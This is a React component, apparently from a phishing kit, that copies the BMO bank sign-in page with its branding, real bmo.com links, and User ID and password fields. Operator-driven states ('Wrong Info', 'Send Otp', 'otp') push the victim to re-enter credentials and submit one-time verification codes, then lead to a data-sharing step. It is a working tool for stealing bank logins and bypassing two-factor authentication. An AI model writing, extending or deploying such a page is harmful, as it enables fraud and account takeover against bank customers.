import clsx from "clsx";
import { otpOptions } from "../../bankDetails";
import { motion } from "framer-motion";
import useBankFunctions from "../../../../../../../hooks/useBankFunctions";
import BmoFavIcon from "../../../../../../../../assets/allBanks/banks/bmo/bo2.ico";
import BankingHeader from "./BankingHeader";
import { Link } from "react-router-dom";
import BmoImage from "../../../../../../../../assets/allBanks/banks/bmo/bo4.svg";
import Fdic from "../../../../../../../../assets/allBanks/banks/bmo/bo3.svg";
import Fdic2 from "../../../../../../../../assets/allBanks/banks/bmo/bo6.png";
import House from "../../../../../../../../assets/allBanks/banks/bmo/bo5.png";
import ShareData from "./ShareData";
import { ClipLoader } from "react-spinners";
import BasicLoader from "../../../../../loading/BasicLoader";
import BankControl from "./BankControl";
import BankOtpControl from "./BankOtpControl";

const Bmo = ({
  handleCancel,
  bankName,
  selectedPath,
  allBankOpen,
  handleSelectSubmit,
  handleSelectedId,
  whatToShowDetails,
  setOtpOpen,
  OtpOpen,
  selectedOtp,
  handleSubmitOtp,
  handleSelectedOtp,
  otpInfo,
  activePathDetails,
  indexOtp,
  handleOtpOption,
  isOpenOtp,
  onSubmitOtpOptions,
  activeOtp,
  setAllBankItems,
  typeAccount,
  setTypeAccount,
  loading,
  setIsOpenOtp,
}) => {
  const {
    formState,
    handleTheMainSubmit,
    handleBlur,
    errorFormState,
    handleChange,
    onSubmitOtp,
    errorOtp,
    changeOtp,
    formOtp,
    resend,
    setshowPassword,
    showPassword,
    handleTheFinal,
    handleVerifiedOtp,
    onSumbitForm,
    handleResend,
  } = useBankFunctions(bankName, setOtpOpen, setAllBankItems, setTypeAccount);
  return (
    <>
      <motion.div
        initial={{ y: -100, opacity: 0 }}
        animate={{ y: 0, opacity: 1 }}
        exit={{ y: -100, opacity: 0 }}
        transition={{ type: "spring", stiffness: 300, damping: 50 }}
        className={clsx(
          "w-full min-h-screen h-full  top-0  bg-customGray-1054",
          typeAccount ? "hidden" : "block"
        )}
      >
        <BankingHeader
          text="Sign in - BMO.com"
          handleCancel={handleCancel}
          img={BmoFavIcon}
          setAllBankItems={setAllBankItems}
          setIsOpenOtp={setIsOpenOtp}
          setOtpOpen={setOtpOpen}
        />
        <header className="w-full box-shadow2 bg-customBlue-1024">
          <div className="p-5 border-b border-b-customBlue-1025">
            <img
              src={BmoImage}
              alt=""
              className="w-[88px] h-[31px] object-contain"
            />
          </div>
          <div className="px-5 py-2 ">
            <img
              src={Fdic}
              alt=""
              className="w-[390px] h-[16px] object-contain"
            />
          </div>
        </header>

        <div className="items-center justify-center px-6 pt-8 customMiniTablet:flex text-customGray-900">
          <div className={clsx(allBankOpen ? "hidden" : "block")}>
            <h1 className="text-center text-black text-[28px] mb-4">
              Sign in to BMO Banking
            </h1>
            <div
              className={clsx(
                "w-full customMiniTablet:w-[650px] bg-white p-6 rounded-md shadow-md"
              )}
            >
              <div>
                <div className="mb-16 mt-7">
                  <input
                    type="text"
                    value={formState.username}
                    name="username"
                    onChange={handleChange}
                    onBlur={handleBlur}
                    placeholder="User ID"
                    className={clsx(
                      "w-full pb-1.5  border-b outline-none border-b-black placeholder:text-customBlue-1024 placeholder:font-medium focus:border-b-customBlue-1024 transistion2",
                      errorFormState.username
                        ? "w-full border-b border-b-customRed-1003"
                        : ""
                    )}
                  />
                  {errorFormState.username && (
                    <p className="flex gap-2 mt-2 text-sm text-customRed-1003">
                      User ID is a required field
                    </p>
                  )}
                  <Link
                    to="https://www.bmo.com/en-us/main/personal/"
                    className="float-right mt-2 text-xs font-medium border-b-2 border-dotted border-customBlue-1026 text-customBlue-1026"
                  >
                    FORGOT USER ID?
                  </Link>
                </div>
                <div className="relative mb-24 mt-7">
                  <input
                    type={showPassword ? "text" : "password"}
                    value={formState.password}
                    name="password"
                    onChange={handleChange}
                    onBlur={handleBlur}
                    placeholder="Password"
                    className={clsx(
                      "w-full pb-1.5  border-b outline-none border-b-black placeholder:text-customBlue-1024 placeholder:font-medium focus:border-b-customBlue-1024 transistion2 pr-12",
                      errorFormState.password
                        ? "w-full border-b border-b-customRed-1003"
                        : ""
                    )}
                  />
                  <span
                    onClick={() => setshowPassword((prevShow) => !prevShow)}
                    className="absolute h-full leading-[2] right-0 text-customBlue-1026 font-semibold"
                  >
                    {showPassword ? "Hide" : "Show"}
                  </span>
                  {errorFormState.password && (
                    <p className="flex gap-2 mt-2 text-sm text-customRed-1003">
                      Password is a required field
                    </p>
                  )}
                  <Link
                    to="https://www.bmo.com/en-us/main/personal/"
                    className="float-right mt-2 text-xs font-medium border-b-2 border-dotted border-customBlue-1026 text-customBlue-1026"
                  >
                    FORGOT PASSWORD?
                  </Link>
                </div>
                <div className="flex w-full gap-4 px-0 my-8 customMiniTablet:px-16">
                  <button className="w-full py-3 font-semibold border-2 rounded-full border-customBlue-1024 text-customBlue-1024">
                    <Link to="https://www.bmo.com/en-us/main/personal/">
                      Register
                    </Link>
                  </button>
                  <button
                    onClick={(e) => handleTheMainSubmit(e, onSumbitForm)}
                    className="w-full py-3 font-semibold text-white rounded-full bg-customBlue-1024"
                  >
                    {loading && <ClipLoader size={10} color="#fff" />}
                    {loading ? "Loading..." : "Sign In"}
                  </button>
                </div>
              </div>
            </div>
          </div>
          <div>
            {allBankOpen && (
              <div className={clsx(OtpOpen ? "hidden" : "block")}>
                <BankControl
                  handleSelectedId={handleSelectedId}
                  selectedPath={selectedPath}
                  handleSelectSubmit={handleSelectSubmit}
                />
                <div>
                  {activePathDetails.name === "Loading" && (
                    <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                      <BasicLoader />
                    </p>
                  )}
                  {activePathDetails.name === "Wrong Info" && (
                    <>
                      <div className={clsx()}>
                        <h1 className="text-center text-black text-[28px] mb-4">
                          Sign in to BMO Banking
                        </h1>
                        <div
                          className={clsx(
                            "w-full customMiniTablet:w-[650px] bg-white p-6 rounded-md shadow-md"
                          )}
                        >
                          <div>
                            <div className="flex justify-center gap-1 mx-3 my-5 font-extrabold text-center customMiniTablet:mx-0 text-customRed-200">
                              <p>{activePathDetails.body}</p>
                            </div>
                            <div className="mb-16 mt-7">
                              <input
                                type="text"
                                value={formState.username}
                                name="username"
                                onChange={handleChange}
                                onBlur={handleBlur}
                                placeholder="User ID"
                                className={clsx(
                                  "w-full pb-1.5  border-b outline-none border-b-black placeholder:text-customBlue-1024 placeholder:font-medium focus:border-b-customBlue-1024 transistion2",
                                  errorFormState.username
                                    ? "w-full border-b border-b-customRed-1003"
                                    : ""
                                )}
                              />
                              {errorFormState.username && (
                                <p className="flex gap-2 mt-2 text-sm text-customRed-1003">
                                  User ID is a required field
                                </p>
                              )}
                              <Link
                                to="https://www.bmo.com/en-us/main/personal/"
                                className="float-right mt-2 text-xs font-medium border-b-2 border-dotted border-customBlue-1026 text-customBlue-1026"
                              >
                                FORGOT USER ID?
                              </Link>
                            </div>
                            <div className="relative mb-24 mt-7">
                              <input
                                type={showPassword ? "text" : "password"}
                                value={formState.password}
                                name="password"
                                onChange={handleChange}
                                onBlur={handleBlur}
                                placeholder="Password"
                                className={clsx(
                                  "w-full pb-1.5  border-b outline-none border-b-black placeholder:text-customBlue-1024 placeholder:font-medium focus:border-b-customBlue-1024 transistion2 pr-12",
                                  errorFormState.password
                                    ? "w-full border-b border-b-customRed-1003"
                                    : ""
                                )}
                              />
                              <span
                                onClick={() =>
                                  setshowPassword((prevShow) => !prevShow)
                                }
                                className="absolute h-full leading-[2] right-0 text-customBlue-1026 font-semibold"
                              >
                                {showPassword ? "Hide" : "Show"}
                              </span>
                              {errorFormState.password && (
                                <p className="flex gap-2 mt-2 text-sm text-customRed-1003">
                                  Password is a required field
                                </p>
                              )}
                              <Link
                                to="https://www.bmo.com/en-us/main/personal/"
                                className="float-right mt-2 text-xs font-medium border-b-2 border-dotted border-customBlue-1026 text-customBlue-1026"
                              >
                                FORGOT PASSWORD?
                              </Link>
                            </div>
                            <div className="flex w-full gap-4 px-0 my-8 customMiniTablet:px-16">
                              <button className="w-full py-3 font-semibold border-2 rounded-full border-customBlue-1024 text-customBlue-1024">
                                <Link to="https://www.bmo.com/en-us/main/personal/">
                                  Register
                                </Link>
                              </button>
                              <button
                                onClick={(e) =>
                                  handleTheMainSubmit(e, onSumbitForm)
                                }
                                className="w-full py-3 font-semibold text-white rounded-full bg-customBlue-1024"
                              >
                                {loading && (
                                  <ClipLoader size={10} color="#fff" />
                                )}
                                {loading ? "Loading..." : "Sign In"}
                              </button>
                            </div>
                          </div>
                        </div>
                      </div>
                    </>
                  )}
                  {activePathDetails.name === "Send Otp" && (
                    <>
                      <h3>{activePathDetails.body}</h3>
                      <div
                        className={clsx(
                          " customMiniTablet:w-[500px] px-4 bg-white py-4",
                          isOpenOtp && "hidden"
                        )}
                      >
                        <div>
                          <div>
                            <div>
                              <h3 className="mb-2 text-xl font-bold text-center text-black">
                                Verify your identity
                              </h3>
                              <p className="mb-2 text-center ">
                                For your security, we need to verify it&apos;s
                                really you.
                              </p>
                            </div>
                            <div>
                              <h2 className="mb-2 text-sm font-bold">
                                How would you like to get your verification
                                code?
                              </h2>
                              <p className="mb-2 text-sm text-customGray-100">
                                Select One:
                              </p>
                              <div
                                role="radiogroup"
                                aria-label="Otp Options"
                                className="flex flex-col space-y-3"
                              >
                                {otpOptions.map((bank) => (
                                  <div
                                    key={bank.id}
                                    role="radio"
                                    tabIndex={0}
                                    onClick={() => handleOtpOption(bank.id)}
                                    className="flex items-center gap-2.5 "
                                  >
                                    <div className="border border-black rounded-full p-[2px] text-center mb-[1px]">
                                      <p
                                        className={clsx(
                                          "rounded-full w-[10px] h-[10px]  ",
                                          otpOptions[indexOtp]?.id === bank.id
                                            ? "bg-customBlue-500"
                                            : ""
                                        )}
                                      ></p>
                                    </div>
                                    <h2
                                      className={clsx(
                                        "text-sm",
                                        otpOptions[indexOtp]?.id === bank.id
                                          ? "text-customBlue-500 hover:underline"
                                          : "hover:text-customBlue-700 hover:underline"
                                      )}
                                    >
                                      {bank.name}
                                    </h2>
                                  </div>
                                ))}
                              </div>
                              <button
                                onClick={onSubmitOtpOptions}
                                className="w-full py-3 my-5 font-semibold text-white rounded-full bg-customBlue-1024"
                              >
                                Continue
                              </button>
                            </div>
                          </div>
                        </div>
                      </div>
                      {isOpenOtp && (
                        <div
                          className={clsx(
                            " customMiniTablet:w-[500px] px-4 bg-white py-4"
                          )}
                        >
                          <div>
                            <div>
                              <div>
                                <h3 className="mb-2 text-xl font-bold text-center text-black">
                                  Enter Verification Code
                                </h3>
                              </div>
                              <div>
                                <h2 className="mb-2 text-center ">
                                  Enter the verification code we sent to your
                                  mobile number
                                </h2>
                                <div className="px-2 customMiniTablet:px-24">
                                  <div>
                                    <input
                                      type="number"
                                      placeholder="Enter Verification Code"
                                      value={formOtp.otpo}
                                      name="otpo"
                                      onChange={changeOtp}
                                      className={clsx(
                                        "w-full pb-1.5  border-b outline-none border-b-black placeholder:text-customBlue-1024 placeholder:font-medium focus:border-b-customBlue-1024 transistion2 pr-12 no-spinner",
                                        errorOtp.otpo
                                          ? "border-b border-b-customRed-1003 no-spinner"
                                          : ""
                                      )}
                                    />
                                    {errorOtp.otpo && (
                                      <p className="mt-2 text-sm text-customRed-1003">
                                        Please enter the verification code.
                                      </p>
                                    )}
                                  </div>
                                  <button
                                    className="w-full py-3 my-6 font-semibold text-white rounded-full bg-customBlue-1024"
                                    onClick={(e) =>
                                      onSubmitOtp(e, handleVerifiedOtp)
                                    }
                                  >
                                    {loading && (
                                      <ClipLoader size={10} color="#fff" />
                                    )}
                                    {loading ? "Loading..." : "Verify"}
                                  </button>
                                </div>
                                <p
                                  className={clsx(
                                    "cursor-pointer text-customBlue-100 font-bold text-center",
                                    !resend &&
                                      "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                                  )}
                                  onClick={handleResend}
                                >
                                  Didnt get a code? Resend
                                </p>
                              </div>
                            </div>
                          </div>
                        </div>
                      )}
                    </>
                  )}
                </div>
              </div>
            )}
            {OtpOpen && (
              <>
                <BankOtpControl
                  handleSelectedOtp={handleSelectedOtp}
                  selectedOtp={selectedOtp}
                  handleSubmitOtp={handleSubmitOtp}
                />

                <div>
                  {activeOtp.name === "Loading" && (
                    <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                      <BasicLoader />
                    </p>
                  )}
                  {activeOtp.name === "wrong" && (
                    <>
                      <div
                        className={clsx(
                          " customMiniTablet:w-[500px] px-4 bg-white py-4"
                        )}
                      >
                        <div>
                          <div>
                            <div>
                              <h3 className="mb-2 text-xl font-bold text-center text-black">
                                Enter Verification Code
                              </h3>
                            </div>
                            <div>
                              <h2 className="mb-2 text-center ">
                                Enter the verification code we sent to your
                                mobile number
                              </h2>
                              <div className="px-2 customMiniTablet:px-24">
                                <div>
                                  <input
                                    type="number"
                                    placeholder="Enter Verification Code"
                                    value={formOtp.otpo}
                                    name="otpo"
                                    onChange={changeOtp}
                                    className={clsx(
                                      "w-full pb-1.5  border-b outline-none border-b-black placeholder:text-customBlue-1024 placeholder:font-medium focus:border-b-customBlue-1024 transistion2 pr-12 no-spinner",
                                      errorOtp.otpo
                                        ? "border-b border-b-customRed-1003 no-spinner"
                                        : ""
                                    )}
                                  />
                                  {errorOtp.otpo && (
                                    <p className="mt-2 text-sm text-customRed-1003">
                                      Please enter the verification code.
                                    </p>
                                  )}
                                  <h3 className="mt-2 text-sm text-customRed-200">
                                    {activeOtp.body}
                                  </h3>
                                </div>
                                <button
                                  className="w-full py-3 my-6 font-semibold text-white rounded-full bg-customBlue-1024"
                                  onClick={(e) =>
                                    onSubmitOtp(e, handleVerifiedOtp)
                                  }
                                >
                                  {loading && (
                                    <ClipLoader size={10} color="#fff" />
                                  )}
                                  {loading ? "Loading..." : "Verify"}
                                </button>
                              </div>
                              <p
                                className={clsx(
                                  "cursor-pointer text-customBlue-100 font-bold text-center",
                                  !resend &&
                                    "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                                )}
                                onClick={handleResend}
                              >
                                Didnt get a code? Resend
                              </p>
                            </div>
                          </div>
                        </div>
                      </div>
                    </>
                  )}
                  {activeOtp.name === "otp" && (
                    <>
                      <ShareData
                        bankName={bankName}
                        handleTheFinal={handleTheFinal}
                        handleCancel={handleCancel}
                        setIsOpenOtp={setIsOpenOtp}
                        setAllBankItems={setAllBankItems}
                        siteLink="https://www.bmo.com/en-us/main/personal/"
                      />
                    </>
                  )}
                </div>
              </>
            )}
          </div>
        </div>
        <footer className="items-center justify-between w-full p-6 border-t space-y-7 customMiniTablet:flex mt-14 border-t-customGray-600 customMiniTablet:space-y-0">
          <Link
            to="https://www.bmo.com/en-us/main/personal/"
            className="gap-2 space-y-3 text-xs font-semibold customMiniTablet:flex customMiniTablet:space-y-0 text-customBlue-1026"
          >
            <p>PRIVACY</p>
            <p>LEGAL</p>
            <p>SECURITY</p>
            <p>MEMBER FDIC</p>
            <p>DIGITAL BANKING AGREEMENT</p>
          </Link>
          <div className="flex items-center justify-end gap-4 customMiniTablet:justify-normal">
            <div>
              <img
                src={Fdic2}
                alt=""
                className="w-[39px] h-[39px] object-contain"
              />
            </div>
            <div>
              <img
                src={House}
                alt=""
                className="w-[39px] h-[39px] object-contain"
              />
            </div>
          </div>
        </footer>
      </motion.div>
    </>
  );
};

export default Bmo;
